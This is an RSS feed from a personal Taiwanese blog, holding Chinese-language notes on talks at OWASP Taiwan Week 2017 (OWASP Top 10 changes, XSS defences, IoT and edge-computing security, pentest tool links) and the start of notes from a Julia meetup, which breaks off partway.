<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>Just for noting</title><link>https://blog.m157q.tw/</link><description></description><lastBuildDate>Mon, 20 Nov 2017 18:01:33 +0800</lastBuildDate><item><title>OWASP Taiwan Week 2017</title><link>https://blog.m157q.tw/posts/2017/11/20/owasp-taiwan-week-2017/</link><description>&lt;ul&gt;
&lt;li&gt;event links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://csa.kktix.cc/events/owasp2017"&gt;https://csa.kktix.cc/events/owasp2017&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://2017.owasp.org.tw/agenda_2.html"&gt;http://2017.owasp.org.tw/agenda_2.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="/files/owasp-taiwan-week-2017/OWASP Top 10 2017 GM (en).pdf"&gt;OWASP 2017 Top 10 Golden Master (EN) 備份&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開場&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Top_10_2017-Top_10"&gt;OWASP 2017 Top 10&lt;/a&gt; 已經釋出，上一次正式發佈是 2013 年。  &lt;ul&gt;
&lt;li&gt;2017 分別有 RC1 和 RC2，中間有些差異，大家吵了很久。XD  &lt;/li&gt;
&lt;li&gt;原來 &lt;a href="https://github.com/OWASP/Top10"&gt;OWASP Top 10 有 GitHub Repo&lt;/a&gt; 啊。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20GM%20(en).pdf"&gt;OWASP Top 10 2017 Golden Master&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OWASP 發展趨勢 - 蔡一郎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;簡介  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://owasp.org"&gt;https://owasp.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;OWASP Taiwan 創立約莫 7~8 年，但之前都是被認定為不活躍的社群。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_CTF_Project"&gt;OWASP CTF&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10"&gt;OWASP Top 10&lt;/a&gt; 都有告訴你要如何檢測網站是否有該漏洞。  &lt;/li&gt;
&lt;li&gt;志工性質、無給薪，好處是志工可以優先參加活動。  &lt;/li&gt;
&lt;li&gt;Research and Development  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"&gt;Top 10&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;Zed Attack Proxy (ZAP)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project"&gt;WebGoat&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWASP Taiwan Week 今年是第一次辦。  &lt;/li&gt;
&lt;li&gt;每年 7 月會有個較大型的會議。(OWASP Taiwan Day)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWASP 旗艦計劃 (OWASP Flagship Projects)  &lt;ul&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;OWASP Zed Attack Proxy (ZAP)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Web_Testing_Environment_Project"&gt;OWASP Web Testing Environment Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_OWTF"&gt;OWASP OWTF&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Dependency_Check"&gt;OWASP Dependency Check&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project"&gt;OWASP ModSecurity Core Rule Set Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project"&gt;OWASP CSRFGuard Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtmelton/appsensor"&gt;OWASP AppSensor Project Reference&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Documentation  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project"&gt;OWASP Application Security Verification Standard Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_SAMM_Project"&gt;OWASP Software Assurance Maturity Model (SAMM)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/samm"&gt;https://github.com/OWASP/samm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/File:Owasp-appsensor-guide-v2.pdf"&gt;OWASP AppSensor Project Guide&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"&gt;OWASP Top 10 Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents"&gt;OWASP Testing Guide Project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建議先從 Flagship Projects 開始看，因為這是很多人吵架的結果。XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OWASP Top 10 2017 - Henry Hu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;General introduction to OWASP Top 10  &lt;ul&gt;
&lt;li&gt;first released in 2003  &lt;/li&gt;
&lt;li&gt;flagship project  &lt;/li&gt;
&lt;li&gt;2004, 2007, 2010, 2013, 2017  &lt;/li&gt;
&lt;li&gt;a list of the 10 most critical web application security risks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017 Timeline  &lt;ul&gt;
&lt;li&gt;07/31: Call for Data Open  &lt;/li&gt;
&lt;li&gt;10/09: RC2  &lt;/li&gt;
&lt;li&gt;11/20: Released  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How is OWASP Top 10 generated?  &lt;ul&gt;
&lt;li&gt;Data proven  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web App by Language in survey  &lt;ul&gt;
&lt;li&gt;Java: 54%  &lt;/li&gt;
&lt;li&gt;.NET: 32%  &lt;/li&gt;
&lt;li&gt;JavaScript 快速成長  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Vunlnerability Assessments - HAT vs TAH  &lt;ul&gt;
&lt;li&gt;Human-Augmented Tools (HAT)  &lt;ul&gt;
&lt;li&gt;人去調整工具之後用工具去做掃描  &lt;/li&gt;
&lt;li&gt;很多現有的工具都是 foucs 在 XSS，所以掃出來的結果以 XSS 居多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tool-Augmented Humans (TAH)  &lt;ul&gt;
&lt;li&gt;以人為主去使用工具來做掃描  &lt;/li&gt;
&lt;li&gt;發現的漏洞就比較多樣化。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Top_10_2017-Release_Notes"&gt;2017 RC1 Changed&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;merged 2013-A4: Insecure Direct Object References and 2013-A7: Missing Function Level Access Control back into 2017-A4: Broken Access Control.  &lt;/li&gt;
&lt;li&gt;added 2017-A7: Insufficient Attack Protection  &lt;/li&gt;
&lt;li&gt;added 2017-A10: Underprotected APIs  &lt;/li&gt;
&lt;li&gt;dropped: 2013-A10: Unvalidated Redirects and Forwards  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20GM%20(en).pdf"&gt;2017 Golden Master Changed&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;ADDED  &lt;ul&gt;
&lt;li&gt;A4:2017-XML External Entities (XXE) is a new category primarily supported by source code analysis security testing tools (SAST: Static Application Security Testing tools) data sets.  &lt;/li&gt;
&lt;li&gt;A8:2017-Insecure Deserialization, which permits remote code execution or sensitive object manipulation on affected platforms.  &lt;ul&gt;
&lt;li&gt;Responsible for one of the worst breaches of all time.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A10:2017-Insufficient Logging and Monitoring, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response, and digital forensics.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MERGED  &lt;ul&gt;
&lt;li&gt;A4-Insecure Direct Object References and A7-Missing Function Level Access Control merged into A5:2017-Broken Access Control.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RETIRED  &lt;ul&gt;
&lt;li&gt;A8-Cross-Site Request Forgery (CSRF), Frameworks commonly include CSRF defenses, with &amp;lt; 5% of all apps, now #13.  &lt;/li&gt;
&lt;li&gt;A10-Unvalidated Redirects and Forwards, less than 1% of the data set supports this issue today, now #25.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Significant of Top 10 2017  &lt;ul&gt;
&lt;li&gt;Web front-end  &lt;ul&gt;
&lt;li&gt;Single page application (SPA) wriiten in JS allows the creation of highly modular front end UI/UX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web back-end  &lt;ul&gt;
&lt;li&gt;Microservices written in node.js is now the primary interface for legacy application through API and RESTful web services.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xa4-xxe.md"&gt;A4:2017-XML External Entities (XXE)&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;尤其微軟的 IIS server 的 XML Processor 的設定最有可能有問題  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Billion_laughs_attack"&gt;Billion laughs attack&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xa8-insecure-deserialization.md"&gt;A8:2017 Insecure Deserialization&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;這次制定的過程中其中一個吵架吵的滿兇的一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xaa-logging-detection-response.md"&gt;A10:2017 Insufficient Logging and Monitoring&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;不是只有 web server 而已，應該要把所有的 server log 都納入管轄範圍。  &lt;/li&gt;
&lt;li&gt;大部份的 breach 被發現時潛伏期已經拉長到 200 天前的事了，目前很少人會去看到 200 天前的 log，所以這是新的需要去注意的事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Moving on...  &lt;ul&gt;
&lt;li&gt;除了 Top 10 以外，其實有列出總共 50 個 issues，但事實上當然有更多的安全漏洞。  &lt;/li&gt;
&lt;li&gt;請不要只看 OWASP Top 10，它不是一切，也不是聖經，在開發網站的時候還要注意更多的安全問題。  &lt;/li&gt;
&lt;li&gt;希望各位可以多多參與 OWASP 的社群，因為很缺人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Client Side Security and Testing Tools - David Cervigni&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;JS Security, topics:  &lt;ul&gt;
&lt;li&gt;Evolution of client technologies  &lt;/li&gt;
&lt;li&gt;Why is always more important  &lt;/li&gt;
&lt;li&gt;Why is always more difficult  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Client security is vast  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Client_Side_Testing"&gt;https://www.owasp.org/index.php/Client_Side_Testing&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;XSS  &lt;ul&gt;
&lt;li&gt;XSS is always dangerous  &lt;ul&gt;
&lt;li&gt;consequences  &lt;ul&gt;
&lt;li&gt;XSRF protection bypass  &lt;/li&gt;
&lt;li&gt;Cookies / session stealing  &lt;/li&gt;
&lt;li&gt;Defacement  &lt;/li&gt;
&lt;li&gt;Password / credential stealing  &lt;/li&gt;
&lt;li&gt;Enumeration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anti XSS approaches  &lt;ul&gt;
&lt;li&gt;Classic  &lt;ul&gt;
&lt;li&gt;Validation  &lt;/li&gt;
&lt;li&gt;Filtering  &lt;/li&gt;
&lt;li&gt;HTML Encoding  &lt;/li&gt;
&lt;li&gt;Encoding lib + Contextual encoding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Requires  &lt;ul&gt;
&lt;li&gt;Secure coding standards (enforced!)  &lt;/li&gt;
&lt;li&gt;Knowledge  &lt;/li&gt;
&lt;li&gt;Design (use the right libs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anti XSS evolution  &lt;ul&gt;
&lt;li&gt;Contextual encoding templates  &lt;ul&gt;
&lt;li&gt;Very strict  &lt;ul&gt;
&lt;li&gt;Hard to encode in nested contexts. (double encoding)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mitigations  &lt;ul&gt;
&lt;li&gt;CPC: Content Security Policy  &lt;/li&gt;
&lt;li&gt;ECMAScript security features (e.g. strict mode)  &lt;/li&gt;
&lt;li&gt;Sandboxing JS (Google CAJA, sanitizer libraries)  &lt;/li&gt;
&lt;li&gt;Anti XSS browser features WAF  &lt;/li&gt;
&lt;li&gt;Requires  &lt;ul&gt;
&lt;li&gt;Secure Application Design  &lt;/li&gt;
&lt;li&gt;Third parties JS libraries compatibility  &lt;/li&gt;
&lt;li&gt;Legacy systems?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Flow and Taint analysis  &lt;ul&gt;
&lt;li&gt;Sources  &lt;/li&gt;
&lt;li&gt;Filters  &lt;/li&gt;
&lt;li&gt;Sinks  &lt;/li&gt;
&lt;li&gt;投影片的字有點小，可能可以直接看&lt;a href="https://www.owasp.org/index.php/Static_Code_Analysis"&gt;這份文件&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools for JS Code analysis  &lt;ul&gt;
&lt;li&gt;SCA, static code analysis  &lt;ul&gt;
&lt;li&gt;Heavy  &lt;/li&gt;
&lt;li&gt;Difficult  &lt;/li&gt;
&lt;li&gt;Lower accuracy (false positive)  &lt;/li&gt;
&lt;li&gt;Adaptability (false negatives... needs custom rules)  &lt;/li&gt;
&lt;li&gt;Broad language support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dynamic code analysis  &lt;ul&gt;
&lt;li&gt;Requires instrumentation  &lt;/li&gt;
&lt;li&gt;More accurate  &lt;/li&gt;
&lt;li&gt;Fuzzing capabilities  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Integrated them into SDLC (systems development life cycle) and Automation (CI)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;當萬物相遇電信網路：一探邊緣運算的資安議題與解決方案 - 王騰嶽&lt;/h2&gt;
&lt;p&gt;這個 talk 介紹挺有意思的，&lt;br /&gt;
講了滿多跟電信網路相關的東西，&lt;br /&gt;
平常真的比較少接觸到。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/LPWAN"&gt;LPWAN (Low Power WAN)&lt;/a&gt; 與其他 Wireless 技術  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/NarrowBand_IOT"&gt;NB-IoT&lt;/a&gt; 是 3GPP 標準的窄帶蜂窩物聯網技術，也是 5G 時代一項重要的實體連結技術。  &lt;ul&gt;
&lt;li&gt;NB-IoT 只是 3GPP 技術中的一環。  &lt;/li&gt;
&lt;li&gt;使用專屬的頻譜，必須要花費。但未來不會有爭奪 NB-IoT 頻譜的問題，因為可以直接使用在電信公司現有的電信網路上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LPWAN: NB-IoT, LoRa, sigfox, LTE-M, genu, eightless, waviot  &lt;ul&gt;
&lt;li&gt;使用開放頻譜，不需要購買，所以品質也就無法保證，但價格會較便宜。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bluetooth 的限制是不夠遠。  &lt;/li&gt;
&lt;li&gt;功耗比 ZigBee 還要低，Range 比 3G/4G/5G 還要遠。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NB-IoT 與電信網路架構  &lt;ul&gt;
&lt;li&gt;UE, LTE-Uu (NB-IoT 只有在這段）, eNB, GTP-U (S1-U), S-GW, P-GW, Internet  &lt;/li&gt;
&lt;li&gt;Physical Interface (Last Mile), Backhual, EPC（核心網路）  &lt;/li&gt;
&lt;li&gt;GTP 的世界：GPRS Tunnel 包覆 IP 封包  &lt;/li&gt;
&lt;li&gt;所以使用 NB-IoT 只會在 UE （手機） 和 eNB （基地台） 這段而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Edge Computing (MEC)  &lt;ul&gt;
&lt;li&gt;Mobile Edge  &lt;ul&gt;
&lt;li&gt;電信行動網的邊緣（核心網路與基地台之間）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 為何需要搭配 MEC  &lt;ul&gt;
&lt;li&gt;如果 device 不太需要上 Facebook / LINE / YouTube  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MEC Case  &lt;ul&gt;
&lt;li&gt;車聯網  &lt;/li&gt;
&lt;li&gt;Cache  &lt;ul&gt;
&lt;li&gt;Content cache 有困難，因為加密太多。  &lt;/li&gt;
&lt;li&gt;但 DNS 是可以做的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 與 MEC 合體之後的資安疑慮  &lt;ul&gt;
&lt;li&gt;前情提要  &lt;ul&gt;
&lt;li&gt;核心網路內是沒有 IPS 或 Firewall 的  &lt;/li&gt;
&lt;li&gt;客戶的手機有被攻擊過嗎？  &lt;ul&gt;
&lt;li&gt;沒聽過  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們手機客戶會攻擊人？  &lt;ul&gt;
&lt;li&gt;那不關我的事...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 服務的資安疑慮  &lt;ul&gt;
&lt;li&gt;如果電信商真的要提供這樣的服務的話，應該要更正視這樣的問題。  &lt;/li&gt;
&lt;li&gt;Device 於實體世界被駭，透過 MEC 作為中繼繼續傳播。  &lt;/li&gt;
&lt;li&gt;Device 運算力弱者，不太可能端點防禦，也不太可能裝防毒軟體。  &lt;/li&gt;
&lt;li&gt;在 MEC 與基地台中間安裝 Firewall 或 IPS 就收工了？  &lt;ul&gt;
&lt;li&gt;錯，因為有 Tunnel 存在，一定得請電信公司處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建立 MEC 的資安機制  &lt;ul&gt;
&lt;li&gt;MEC 的平台要提供 IoT 服務進駐  &lt;/li&gt;
&lt;li&gt;MEC 內各個 IoT 服務（VM 型態）要隔離  &lt;/li&gt;
&lt;li&gt;MEC 可以直接進行黑名單 IP 過濾  &lt;/li&gt;
&lt;li&gt;MEC 要轉換 GTP &amp;lt;-&amp;gt; IP 和 GTP termination，於是 IT 產業找到了電信的突破口。  &lt;/li&gt;
&lt;li&gt;進入 IP 世界之後：NFV (Network Functions Virtualization) + SDN  &lt;ul&gt;
&lt;li&gt;VM 監控管理平台  &lt;/li&gt;
&lt;li&gt;網路安全設備  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Security Framework in MEC Platform  &lt;ul&gt;
&lt;li&gt;NFV Inftrastructure Security  &lt;/li&gt;
&lt;li&gt;Network Security  &lt;/li&gt;
&lt;li&gt;Application Authorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;講者認為 IoT + MEC + 資安尚未解決的問題對於軟體從業人員是個在未來有許多發展空間的舞台。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Container 與 Web 安全 - 鄭學輝&lt;/h2&gt;
&lt;p&gt;前半段有點分不清楚是在介紹 Docker 還是在講 container security...&lt;br /&gt;
個人感覺整個投影片比較偏向 Sales Kit...  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新興應用安全技術  &lt;ul&gt;
&lt;li&gt;RUNTIME  &lt;ul&gt;
&lt;li&gt;Runtime Application Self Protection (RASP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;INTERACTIVE  &lt;/li&gt;
&lt;li&gt;SOFTWARE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Python as Hacking Tool - Galoget Latorre&lt;/h2&gt;
&lt;p&gt;原本以為是要現場教學，&lt;br /&gt;
但整場的狀況比較像是，&lt;br /&gt;
前半段推坑 Python，&lt;br /&gt;
後半段 Live Demo 用 Python 寫的 script 的攻擊實況，&lt;br /&gt;
然後提供一些工具供聽眾參考，&lt;br /&gt;
還是沒講要怎麼寫 XD。&lt;br /&gt;
（是說現場直接拿別人的真實個資來 Demo 真的沒問題嗎 www）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python 簡介  &lt;/li&gt;
&lt;li&gt;基本 Google Hacking  &lt;/li&gt;
&lt;li&gt;Some tools  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dloss/python-pentest-tools"&gt;GitHub - dloss/python-pentest-tools: Python tools for penetration testers&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/andresriancho/w3af"&gt;GitHub - andresriancho/w3af: w3af: web application attack and audit framework, the open source web vulnerability scanner.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chinoogawa/fbht"&gt;GitHub - chinoogawa/fbht: Facebook Hacking Tool&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/IFGHou/wapiti"&gt;GitHub - IFGHou/wapiti: A web-application vulnerability scanner&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/QRLJacking"&gt;GitHub - OWASP/QRLJacking: QRLJacking or Quick Response Code Login Jacking is a simple-but-nasty attack vector affecting all the applications that relays on “Login with QR code” feature as a secure way to login into accounts which aims for hijacking users session by attackers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;web swc case study and cyber simulation - 何宜霖&lt;/h2&gt;
&lt;p&gt;（這場講的條理滿清楚的，但會場座位沒得充電，我的 Mac Book Air 2013 已經沒電了 Orz）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;講了釣魚攻擊和水坑攻擊的發生情境  &lt;/li&gt;
&lt;li&gt;腳本駭客的常見攻擊手法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/beefproject/beef"&gt;GitHub - beefproject/beef: The Browser Exploitation Framework Project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;一些很基本的卻常常忽略的問題  &lt;ul&gt;
&lt;li&gt;裝置預設密碼沒改  &lt;/li&gt;
&lt;li&gt;放在 DMZ 東西是否會被外網輕易存取  &lt;/li&gt;
&lt;li&gt;網站測試頁面和測試帳號是否有清除  &lt;ul&gt;
&lt;li&gt;上傳檔案的測試頁面記得關掉，否則就很有可能會被人上傳後門。  &lt;/li&gt;
&lt;li&gt;網路上都有很多現成的後門可以取得了，像是 &lt;a href="https://github.com/tennc/webshell"&gt;GitHub - tennc/webshell: This is a webshell open source project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;物聯網裝置的資安模擬環境會是未來重要的一環  &lt;ul&gt;
&lt;li&gt;電腦跟手機可能不是 24x7 連網，但物聯網裝置基本上都是 24x7 連網而且有的還要求網路的 latency 要很低，一被入侵很有可能成為非常大型的 Bot Net。（沒提到前陣子鬧很大的 Mira 病毒）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然後講者講了一句很有趣的話  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「社交工程一直都可以成功的原因是什麼？因為人腦的愚蠢是不能進行安全性更新的。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;今天聽下來真的覺得滿棒的，&lt;br /&gt;
也對 OWASP 更加瞭解了，&lt;br /&gt;
一直以來都只知道 Top 10 而已，&lt;br /&gt;
今天才發現原來還有很多很好用的 Project 和文件，&lt;br /&gt;
才知道原來以前用的 DirBuster 也是 OWASP 的 project 之一。&lt;br /&gt;
打聽一下才發現原來今年 7 月就有個 OWASP Taiwan Day 了，&lt;br /&gt;
但我當時沒有見到任何宣傳消息。&lt;br /&gt;
現在自己的狀況真的就比較像拿資安當興趣而已，&lt;br /&gt;
要當飯吃的話覺得自己的技術力和學習能力都跟不上這個產業啊。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Mon, 20 Nov 2017 18:01:33 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-11-20:posts/2017/11/20/owasp-taiwan-week-2017/</guid><category>OWASP</category><category>Security</category></item><item><title>Julia Taiwan Meetup #10</title><link>https://blog.m157q.tw/posts/2017/11/17/julia-taiwan-meetup-10/</link><description>&lt;ul&gt;
&lt;li&gt;網址：&lt;a href="https://juliataiwan.kktix.cc/events/6e617417"&gt;https://juliataiwan.kktix.cc/events/6e617417&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開場&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaGPU/"&gt;https://github.com/JuliaGPU/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SimonDanisch/MakiE.jl"&gt;https://github.com/SimonDanisch/MakiE.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Julia 用來增進效能的方法是直接使用 LLVM IR  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OOP and design patterns in Julia - 杜岳華&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;對 Julia OOP system 和 multiple dispatch 的理解程度  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Multiple_dispatch"&gt;https://en.wikipedia.org/wiki/Multiple_dispatch&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Composite over inheritance  &lt;/li&gt;
&lt;li&gt;Decouple the behavior and state  &lt;ul&gt;
&lt;li&gt;先不管 behavior，而是先管 datatype  &lt;/li&gt;
